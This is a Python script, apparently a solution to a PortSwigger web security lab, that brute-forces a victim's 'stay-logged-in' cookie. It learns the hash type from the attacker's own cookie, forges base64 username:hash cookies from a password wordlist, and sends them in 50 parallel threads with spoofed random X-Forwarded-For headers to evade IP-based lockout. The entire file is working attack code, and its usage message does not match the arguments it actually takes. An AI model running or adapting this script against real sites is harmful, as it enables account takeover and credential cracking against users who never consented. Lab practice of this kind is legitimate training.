from requests import request
from io import FileIO 
from random import randint
from re import match as match_regex
from sys import argv
from concurrent.futures import ThreadPoolExecutor,as_completed
import hashlib
from encodings import codecs

def get_session(url):
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def readWorldList(wordlist_name):
    try:
        worldlist=FileIO(wordlist_name).read().decode().split('\n')
        while worldlist.count(''):
            worldlist.remove('')
        return worldlist
    except :
        print('[-] Error While reading file')

def get_suitable_hash_method(digest):
    if match_regex(r"^[a-fA-F0-9]{32}$" ,digest):
        return hashlib.md5
    elif match_regex(r"^[a-fA-F0-9]{40}$" ,digest):
        return hashlib.sha1
    elif match_regex(r"^[a-fA-F0-9]{64}$" ,digest):
        return hashlib.sha256
    elif match_regex(r"^[a-fA-F0-9]{128}$" ,digest):
        return hashlib.sha512
    else:
        return None



def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def get_attacker_staylogin_cookie(url,attacker_username,attacker_password):
    cookies=get_session(url)
    data='username='+attacker_username+'&password='+attacker_password+'&stay-logged-in=on'
    headers={
            'X-Forwarded-For':generate_random_ip(),
            'Cookie':cookies
            }
    res=request(url=url,headers=headers,data=data,method='POST')
    return res.history[0].cookies.get('stay-logged-in')

def parse_attacker_staylogin_cookie(cookie):
    cookie=codecs.decode(str(cookie).encode(),'base64').decode()
    hashed_password=cookie.split(":")[1]
    return hashed_password


def prepare_staylogin_cookie(username,password,hash_function):
    hashed_password=hash_function(str(password).encode()).digest().hex()
    cookie=''+username+':'+hashed_password
    cookie=codecs.encode(cookie.encode(),'base64').decode()
    if cookie[-1]=='\n':
        cookie=cookie[0:-1]
    cookie='stay-logged-in='+cookie+';'
    return cookie

def bruteforce_staylogedin_worker(url,hash_function,username,password):
    try:
        print('[!] Trying => '+username+":"+password)
        cookie=prepare_staylogin_cookie(username,password,hash_function)
        headers={'Cookie':cookie,'X-Forwarded-For':generate_random_ip()}
        res=request(url=url,method='GET',headers=headers)
        content=res.content.decode()
        if content.count('Log in')==0 :
            return 'Cracked With : {username:'+username+',password:'+password+'}'
        else:
            return False
    except Exception :
        return bruteforce_staylogedin_worker(url,hash_function,username,password)

def bruteforce(url,hash_function,username,password_list):
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_login={}
            for password in password_list:
                future=executor.submit(bruteforce_staylogedin_worker,url,hash_function,username,password)
                future_to_login[future]=password
            for future in as_completed(future_to_login):
                try:
                    if future.result():
                        executor.shutdown(wait=False)
                        for other_future in future_to_login.keys():
                            other_future.cancel()
                        print(future.result())
                except:
                    pass

def pwn(url,attacker_username,attacker_password,username,password_wordlist):
    if url[-1]!='/':
        url=url+'/'
    password_wordlist=readWorldList(password_wordlist)
    hash_function= get_suitable_hash_method(parse_attacker_staylogin_cookie(get_attacker_staylogin_cookie(url+'login',attacker_username,attacker_password)))
    bruteforce(url+'my-account',hash_function,username,password_wordlist)

if __name__ == "__main__":
 print("""
    0xCrypt00o Soluation for Portswigger LAB : 
        For More Soluation check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==6:
     pwn(argv[1],argv[2],argv[3],argv[4],argv[5])
 else:
     print("call it with : ./pwn-auth-username-enumeration-via-different-responses.py <url> <attacker username> <attacker_password> <victime_username> <path to username wordlist> <path to password wordlist> ")
 
